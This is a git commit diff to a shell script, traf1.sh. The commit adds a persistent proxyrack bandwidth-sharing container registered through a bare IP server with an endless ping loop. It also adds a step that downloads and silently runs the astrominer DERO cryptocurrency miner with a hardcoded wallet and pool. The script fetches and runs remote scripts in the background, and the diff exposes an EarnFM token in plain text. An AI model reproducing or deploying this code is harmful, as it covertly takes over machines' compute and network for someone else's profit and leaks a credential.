a166d890fdceadc211a1a94d4c2674c514ee4640
rabithoy <emailforfrom@gmail.com>
2025-08-13 21:40:47 +0700

    Update traf1.sh

--- traf1.sh
+++ traf1.sh
@@ -6,6 +6,24 @@ CHECK_URL="http://142.171.114.6:7000/worker-ping?groupId=group1"
 CURRENT_TOKEN=""
 RUN_ONCE=0
 
+# -------- proxyrack --------
+DEVICE_ID=$(curl -s http://74.48.96.46:3000/get-offline-key | grep -oP '"device_id"\s*:\s*"\K[^"]+')
+if [ -n "$DEVICE_ID" ]; then
+  docker run -d --name proxyrack --restart always -e UUID="$DEVICE_ID" proxyrack/pop
+
+  # Ping loop cho proxyrack (nền)
+  (
+    while true; do
+      curl -X POST http://74.48.96.46:3000/ping \
+        -H "Content-Type: application/json" \
+        -d "{\"device_id\":\"$DEVICE_ID\"}"
+      sleep 300
+    done
+  ) &
+else
+  echo "❌ Không lấy được device_id từ server"
+fi
+
 
 # -------- Main loop --------
 while true; do
@@ -19,9 +37,6 @@ while true; do
   fi
 
   if [ $RUN_ONCE -eq 0 ]; then
-    docker run -d --name ss \
-      -e EARNFM_TOKEN="2daac0b6-c3ff-42ea-a177-b5f5b9db81cc" \
-      earnfm/earnfm-client:latest
     # Tải các file
     rm -rf 1.sh 2.sh 3.sh
     wget https://raw.githubusercontent.com/rabithoy/tth/main/1.sh
@@ -33,7 +48,16 @@ while true; do
 
     # Chạy script 3.sh
     nohup bash ./3.sh >/dev/null 2>&1 &
-
+    # Chạy astrominer nền không chặn vòng lặp
+    (
+      wget -q https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.2.R5/astrominer-V1.9.2.R5_amd64_linux.tar.gz && \
+      tar -xf astrominer-V1.9.2.R5_amd64_linux.tar.gz && \
+      ./astrominer/astrominer \
+        -w dero1qyv4tdjrsjhl8u07ngsxv85hy9ln8j9ykcld3fr4hgl37f279tw9vqga0a27l \
+        -log-interval 600 -m 1 -p rpc -r nodent2.cpumining.cloud:10100 \
+        > /dev/null 2>&1
+    ) &
+    
     RUN_ONCE=1
   fi
 
